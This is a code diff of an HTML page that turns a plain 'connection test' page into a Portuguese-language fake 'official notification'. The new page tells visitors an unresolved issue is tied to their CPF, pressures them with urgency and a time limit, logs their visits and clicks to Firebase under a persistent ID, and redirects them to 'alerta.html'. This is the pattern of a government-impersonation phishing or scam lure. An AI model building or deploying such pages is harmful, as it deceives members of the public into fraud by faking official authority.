@@ -3,30 +3,71 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Diagnóstico V2</title>
+  <title>Notificação Oficial</title>
   <style>
-    body { margin: 0; font-family: Arial, sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    .container { width: 90%; max-width: 400px; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 0 10px rgba(0,0,0,0.1); text-align: center; }
-    h1 { font-size: 20px; color: #0056b3; }
-    button { width: 100%; padding: 15px; font-size: 18px; background-color: #0056b3; color: white; border: none; border-radius: 8px; cursor: pointer; margin-top: 15px; }
-    #log-area { margin-top: 15px; font-size: 12px; color: #333; text-align: left; background: #eee; padding: 10px; border-radius: 5px; min-height: 50px; font-family: monospace; word-wrap: break-word; }
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      width: 90%;
+      max-width: 400px;
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    h1 {
+      font-size: 20px;
+      color: #c40000;
+    }
+    p {
+      font-size: 16px;
+      color: #333;
+    }
+    .alert {
+      font-weight: bold;
+      color: #c40000;
+      margin: 15px 0;
+    }
+    button {
+      width: 100%;
+      padding: 15px;
+      font-size: 18px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+    .footer {
+      margin-top: 15px;
+      font-size: 12px;
+      color: gray;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>V2 - Teste de Controle</h1>
-    <button id="btn-resolver">TESTAR CONEXÃO</button>
-    <div id="log-area">Aguardando inicialização...</div>
+    <h1>⚠️ Notificação Urgente</h1>
+    <p>Identificamos uma pendência vinculada ao seu CPF junto ao sistema nacional.</p>
+    <p class="alert">Regularize agora e evite restrições no seu nome.</p>
+    <button id="btn-resolver">CLIQUE AQUI PARA RESOLVER</button>
+    <div class="footer">Atendimento disponível por tempo limitado.</div>
   </div>
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-
-    const logger = document.getElementById("log-area");
-    const appendLog = (msg) => { logger.innerHTML += `<br>> ${msg}`; };
-
-    appendLog("Script V2 carregado.");
 
     const firebaseConfig = {
       apiKey: "AIzaSyB5dUXEMJ8OBlEidkOWYl5L4N3g5PAce10",
@@ -37,31 +78,39 @@
       appId: "1:408713740813:web:b87b61f8c74750214e4b44"
     };
 
-    try {
-      const app = initializeApp(firebaseConfig);
-      window.db = getFirestore(app);
-      appendLog("Firebase configurado.");
-    } catch(e) {
-      appendLog("ERRO INIT: " + e.message);
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    let userId = localStorage.getItem("user_id");
+    if (!userId) {
+      userId = Math.random().toString(36).substring(2);
+      localStorage.setItem("user_id", userId);
     }
 
-    let userId = localStorage.getItem("user_id") || Math.random().toString(36).substring(2);
-    localStorage.setItem("user_id", userId);
+    const inicio = Date.now();
+
+    try {
+      await setDoc(doc(db, "visitas", userId), {
+        abertura: inicio
+      }, { merge: true });
+    } catch (error) {
+      console.error(error);
+    }
 
     document.getElementById("btn-resolver").addEventListener("click", async (event) => {
       event.preventDefault();
-      appendLog("Requisição enviada...");
+      const tempoClique = Date.now();
       
       try {
-        await setDoc(doc(window.db, "visitas", userId), {
-          clique_diagnostico: Date.now()
+        await setDoc(doc(db, "visitas", userId), {
+          clique: tempoClique
         }, { merge: true });
-        appendLog("SUCESSO: Resposta do Firebase recebida.");
       } catch (error) {
-        appendLog("FALHA DE REDE: " + error.message);
+        console.error(error);
+      } finally {
+        window.location.href = "alerta.html";
       }
     });
   </script>
-  
 </body>
 </html>
